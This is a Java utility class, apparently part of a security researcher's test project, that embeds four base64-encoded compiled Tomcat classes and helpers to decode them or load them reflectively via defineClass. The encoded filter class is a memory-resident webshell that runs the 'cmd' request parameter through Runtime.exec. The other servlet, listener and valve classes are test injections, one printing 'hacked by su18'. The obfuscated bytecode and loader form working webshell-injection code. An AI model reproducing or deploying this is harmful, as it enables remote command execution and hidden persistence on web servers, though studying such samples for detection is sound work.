package cc.saferoad.Test;/*
@auther S0cke3t
@date 2021-12-27
*/


import sun.misc.BASE64Decoder;

import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

public class DynamicUtils {
    public static String FILTER_CLASS_STRING = "yv66vgAAADQAeQoAEgBDCABECwBFAEYKAAoARwsASABJCgBKAEsKAEoATAoATQBOCgBPAFAHAFEK\n" +
            "AAoAUgoAUwBUCgBPAFUKAFMAVgoAUwBVCwBXAFgHAFkHAFoHAFsBAAY8aW5pdD4BAAMoKVYBAARD\n" +
            "b2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIkxjYy9z\n" +
            "YWZlcm9hZC9UZXN0L0ZpbHRlclNoZWxsVGVzdDsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0Zp\n" +
            "bHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZp\n" +
            "ZzsBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2Vy\n" +
            "dmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAANvdXQB\n" +
            "ABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEA\n" +
            "AmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABYQEAAUkBAAFiAQACW0IBAA5zZXJ2bGV0UmVx\n" +
            "dWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEA\n" +
            "H0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9z\n" +
            "ZXJ2bGV0L0ZpbHRlckNoYWluOwEAB2NvbW1hbmQBABJMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFj\n" +
            "a01hcFRhYmxlBwBZBwBcBwBdBwBeBwBRBwBfBwBgBwBhBwAqAQAKRXhjZXB0aW9ucwcAYgcAYwEA\n" +
            "B2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAURmlsdGVyU2hlbGxUZXN0LmphdmEMABQAFQEAA2NtZAcA\n" +
            "XAwAZABlDABmAGcHAF0MAGgAaQcAagwAawBsDABtAG4HAGAMAG8AcAcAYQwAcQByAQAQamF2YS9s\n" +
            "YW5nL1N0cmluZwwAFABzBwBfDAB0AHUMAHYAFQwAdwAVBwBeDAAfAHgBACBjYy9zYWZlcm9hZC9U\n" +
            "ZXN0L0ZpbHRlclNoZWxsVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0Zp\n" +
            "bHRlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZs\n" +
            "ZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABNqYXZhL2lvL1ByaW50V3Jp\n" +
            "dGVyAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9J\n" +
            "T0V4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEADGdldFBhcmFtZXRl\n" +
            "cgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNFbXB0eQEAAygp\n" +
            "WgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQARamF2YS9sYW5nL1J1bnRp\n" +
            "bWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9s\n" +
            "YW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2\n" +
            "YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQAFKFtCKUkBAAcoW0JJSSlWAQAHcHJpbnRsbgEAFShM\n" +
            "amF2YS9sYW5nL1N0cmluZzspVgEABWNsb3NlAQAFZmx1c2gBAEAoTGphdmF4L3NlcnZsZXQvU2Vy\n" +
            "dmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAEQASAAEAEwAA\n" +
            "AAQAAQAUABUAAQAWAAAAMwABAAEAAAAFKrcAAbEAAAACABcAAAAKAAIAAAAPAAQAEAAYAAAADAAB\n" +
            "AAAABQAZABoAAAABABsAHAABABYAAAA1AAAAAgAAAAGxAAAAAgAXAAAABgABAAAAFAAYAAAAFgAC\n" +
            "AAAAAQAZABoAAAAAAAEAHQAeAAEAAQAfACAAAgAWAAABbgAGAAoAAAB0KxICuQADAgA6BBkExgBf\n" +
            "GQS2AASaAFcsuQAFAQA6BbgABhkEtgAHOgYZBrYACDoHAzYIEQQAvAg6CRkHGQm2AAlZNggCnwAX\n" +
            "GQW7AApZGQkDFQi3AAu2AAyn/+EZB7YADRkFtgAOGQW2AA8tKyy5ABADALEAAAADABcAAAA6AA4A\n" +
            "AAAYAAoAGQAXABoAHwAbACkAHAAwAB0AMwAeADoAHwBIACAAXAAiAGEAIwBmACQAawAmAHMAJwAY\n" +
            "AAAAZgAKAB8ATAAhACIABQApAEIAIwAkAAYAMAA7ACUAJgAHADMAOAAnACgACAA6ADEAKQAqAAkA\n" +
            "AAB0ABkAGgAAAAAAdAArACwAAQAAAHQALQAuAAIAAAB0AC8AMAADAAoAagAxADIABAAzAAAAPAAD\n" +
            "/wA6AAoHADQHADUHADYHADcHADgHADkHADoHADsBBwA8AAAh/wAOAAUHADQHADUHADYHADcHADgA\n" +
            "AAA9AAAABgACAD4APwABAEAAFQABABYAAAArAAAAAQAAAAGxAAAAAgAXAAAABgABAAAALAAYAAAA\n" +
            "DAABAAAAAQAZABoAAAABAEEAAAACAEI=";
    public static String SERVLET_CLASS_STRING = "yv66vgAAADQANAoABgAjCwAkACUIACYKACcAKAcAKQcAKgcAKwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQArTG9yZy9zdTE4L21lbXNoZWxsL3Rlc3QvdG9tY2F0L1Rlc3RTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHACwBABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7BwAtAQAOZ2V0U2VydmxldEluZm8BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAQVGVzdFNlcnZsZXQuamF2YQwACAAJBwAuDAAvADABAARzdTE4BwAxDAAyADMBAClvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0U2VydmxldAEAEGphdmEvbGFuZy9PYmplY3QBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAEABwAAAAYAAQAIAAkAAQAKAAAALwABAAEAAAAFKrcAAbEAAAACAAsAAAAGAAEAAAAJAAwAAAAMAAEAAAAFAA0ADgAAAAEADwAQAAIACgAAADUAAAACAAAAAbEAAAACAAsAAAAGAAEAAAAOAAwAAAAWAAIAAAABAA0ADgAAAAAAAQARABIAAQATAAAABAABABQAAQAVABYAAQAKAAAALAABAAEAAAACAbAAAAACAAsAAAAGAAEAAAASAAwAAAAMAAEAAAACAA0ADgAAAAEAFwAYAAIACgAAAE4AAgADAAAADCy5AAIBABIDtgAEsQAAAAIACwAAAAoAAgAAABcACwAYAAwAAAAgAAMAAAAMAA0ADgAAAAAADAAZABoAAQAAAAwAGwAcAAIAEwAAAAYAAgAUAB0AAQAeAB8AAQAKAAAALAABAAEAAAACAbAAAAACAAsAAAAGAAEAAAAcAAwAAAAMAAEAAAACAA0ADgAAAAEAIAAJAAEACgAAACsAAAABAAAAAbEAAAACAAsAAAAGAAEAAAAiAAwAAAAMAAEAAAABAA0ADgAAAAEAIQAAAAIAIg==";
    public static String LISTENER_CLASS_STRING = "yv66vgAAADQAVwoAEQArCgAsAC0HAC4KABEALwgAHAoAMAAxCgAyADMKADIANAcANQoACQA2CgA3ADgIADkKADoAOwcAPAoADgA9BwA+BwA/BwBAAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACxMb3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdExpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAB3JlcXVlc3QBAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdEZhY2FkZTsBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA3JlcQEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNzZXJ2bGV0UmVxdWVzdEV2ZW50AQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBAA1TdGFja01hcFRhYmxlBwA8AQAScmVxdWVzdEluaXRpYWxpemVkAQAKU291cmNlRmlsZQEAEVRlc3RMaXN0ZW5lci5qYXZhDAATABQHAEEMAEIAQwEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3RGYWNhZGUMAEQARQcARgwARwBIBwBJDABKAEsMAEwATQEAJW9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3QMAE4ATwcAUAwAUQBSAQAPCmhhY2tlZCBieSBzdTE4BwBTDABUAFUBABNqYXZhL2xhbmcvRXhjZXB0aW9uDABWABQBACpvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0TGlzdGVuZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAD3ByaW50U3RhY2tUcmFjZQAhABAAEQABABIAAAADAAEAEwAUAAEAFQAAAC8AAQABAAAABSq3AAGxAAAAAgAWAAAABgABAAAADQAXAAAADAABAAAABQAYABkAAAABABoAGwABABUAAADIAAIABQAAADcrtgACwAADTSy2AAQSBbYABk4tBLYABy0stgAIwAAJOgQZBLYACrYACxIMtgANpwAITSy2AA+xAAEAAAAuADEADgADABYAAAAmAAkAAAAXAAgAGAASABkAFwAaACEAHAAuACAAMQAeADIAHwA2ACMAFwAAAD4ABgAIACYAHAAdAAIAEgAcAB4AHwADACEADQAgACEABAAyAAQAIgAjAAIAAAA3ABgAGQAAAAAANwAkACUAAQAmAAAABwACcQcAJwQAAQAoABsAAQAVAAAANQAAAAIAAAABsQAAAAIAFgAAAAYAAQAAACwAFwAAABYAAgAAAAEAGAAZAAAAAAABACQAJQABAAEAKQAAAAIAKg==";
    public static String VALVE_CLASS_STRING = "yv66vgAAADQAMQoACAAbCgAcAB0IAB4KAB8AIAoABwAhCwAiACMHACQHACUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKUxvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0VmFsdmU7AQAGaW52b2tlAQBSKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0O0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTspVgEAB3JlcXVlc3QBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBAAhyZXNwb25zZQEAKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBAApFeGNlcHRpb25zBwAmBwAnAQAKU291cmNlRmlsZQEADlRlc3RWYWx2ZS5qYXZhDAAJAAoHACgMACkAKgEAEkkgY29tZSBoZXJlIGZpcnN0IQcAKwwALAAtDAAuAC8HADAMABAAEQEAJ29yZy9zdTE4L21lbXNoZWxsL3Rlc3QvdG9tY2F0L1Rlc3RWYWx2ZQEAJG9yZy9hcGFjaGUvY2F0YWxpbmEvdmFsdmVzL1ZhbHZlQmFzZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAdnZXROZXh0AQAdKClMb3JnL2FwYWNoZS9jYXRhbGluYS9WYWx2ZTsBABlvcmcvYXBhY2hlL2NhdGFsaW5hL1ZhbHZlACEABwAIAAAAAAACAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAADQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAABbAAMAAwAAABUstgACEgO2AAQqtgAFKyy5AAYDALEAAAACAAwAAAAOAAMAAAARAAkAEwAUABQADQAAACAAAwAAABUADgAPAAAAAAAVABIAEwABAAAAFQAUABUAAgAWAAAABgACABcAGAABABkAAAACABo=";

    public static InputStream base64ToInputStream(String base64) {
        ByteArrayInputStream stream = null;
        try {
            byte[] bytes = Base64.getDecoder().decode(base64);
            stream = new ByteArrayInputStream(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return stream;
    }

    public static void getFile(InputStream is, String fileName) throws IOException {
        BufferedInputStream in = null;
        BufferedOutputStream out = null;
        in = new BufferedInputStream(is);
        out = new BufferedOutputStream(new FileOutputStream(fileName));
        int len = -1;
        byte[] b = new byte[1024];
        while ((len = in.read(b)) != -1) {
            out.write(b, 0, len);
        }
        in.close();
        out.close();
    }

    public static Class<?> getClass(String classCode) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        BASE64Decoder base64Decoder = new BASE64Decoder();
        byte[] bytes = base64Decoder.decodeBuffer(classCode);

        Method method = null;
        Class<?> clz = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;

    }

    public static void main(String[] args) throws Exception {

        //getFile(base64ToInputStream(FILTER_CLASS_STRING), "filter.class");
        //getFile(base64ToInputStream(SERVLET_CLASS_STRING), "servlet.class");
        //getFile(base64ToInputStream(LISTENER_CLASS_STRING), "listener.class");
        getFile(base64ToInputStream(VALVE_CLASS_STRING), "valve.class");
    }
}
